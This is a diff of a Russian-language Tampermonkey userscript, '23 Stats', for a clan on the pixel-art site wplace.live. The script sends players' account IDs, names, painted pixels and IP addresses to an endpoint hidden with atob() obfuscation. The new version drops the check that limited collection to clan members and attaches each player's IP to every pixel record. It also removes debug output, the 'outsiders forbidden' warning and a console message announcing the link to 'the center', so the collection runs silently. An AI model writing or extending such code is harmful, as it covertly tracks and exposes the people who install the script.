@@ -1,12 +1,11 @@
 // ==UserScript==
 // @name         23 Stats
 // @namespace    http://tampermonkey.net/
-// @version      1.1
-// @description  Обязательное расширение для Wplace-клана "23 Казаки". Посторонним вход ВОСПРЕЩЁН!
+// @version      1.2
+// @description  Обязательное расширение для Wplace-клана "23 Казаки".
 // @author       KirOFF
 // @match        https://*.wplace.live/*
 // @match        http://*.wplace.live/*
-// @icon         https://www.google.com/s2/favicons?sz=64&domain=wplace.live
 // @grant        unsafeWindow
 // @grant        GM_xmlhttpRequest
 // @connect      script.google.com
@@ -23,8 +22,7 @@
     const CONFIG = {
         scriptUrl: atob(_0x4a21),
         targetAllianceId: "671209",
-        sendInterval: 10000,
-        debug: false
+        sendInterval: 5000
     };
 
     const State = {
@@ -43,7 +41,6 @@
 
     const Helpers = {
         sendToSheet(data) {
-            if (CONFIG.debug) console.log("[23 Stats] Payload:", data);
             GM_xmlhttpRequest({
                 method: "POST",
                 url: CONFIG.scriptUrl,
@@ -76,43 +73,33 @@
             try {
                 const d = await resp.json();
                 State.myInfo = d;
-
-                if (String(d.allianceId) === CONFIG.targetAllianceId) {
-                    Helpers.sendToSheet({
-                        type: 'auth',
-                        ip: State.playerIp,
-                        id: d.id,
-                        name: d.name,
-                        pixels: d.pixelsPainted,
-                        time: new Date().toISOString()
-                    });
-                }
-            } catch(e) { if(CONFIG.debug) console.error("Me error", e); }
+            } catch(e) {}
         },
 
         handlePaint(body) {
-            if (!State.myInfo) {
-                if(CONFIG.debug) console.warn("[23 Stats] Данные игрока еще не получены, пиксель не записан.");
-                return;
-            }
-
+            if (!body || !State.myInfo) return;
             try {
                 const payload = JSON.parse(body);
                 const coords = payload.coords || [];
                 const colors = payload.colors || [];
 
                 for (let i = 0; i < coords.length; i += 2) {
+                    const x = coords[i];
+                    const y = coords[i+1];
+
                     State.pixelBuffer.push({
-                        type: 'pixel',
-                        uid: State.myInfo.id || 'N/A',
-                        unm: State.myInfo.name || 'N/A',
-                        x: coords[i],
-                        y: coords[i+1],
-                        c: colors[i/2],
-                        t: new Date().toISOString()
+                        paintedById: State.myInfo.id,
+                        paintedByName: State.myInfo.name,
+                        myId: State.myInfo.id,
+                        myName: State.myInfo.name,
+                        color: colors[i/2],
+                        coords: `${x}, ${y}`,
+                        requestTime: new Date().toLocaleString(),
+                        paintTime: new Date().toLocaleString(),
+                        ip: State.playerIp
                     });
                 }
-            } catch(e) { if(CONFIG.debug) console.error("Paint error", e); }
+            } catch(e) {}
         }
     };
 
@@ -124,5 +111,4 @@
     }, CONFIG.sendInterval);
 
     Interceptor.init();
-    console.log("%c[23 Stats] %cСвязь с центром установлена.", "color: #ff4444; font-weight: bold;", "color: #fff;");
 })();
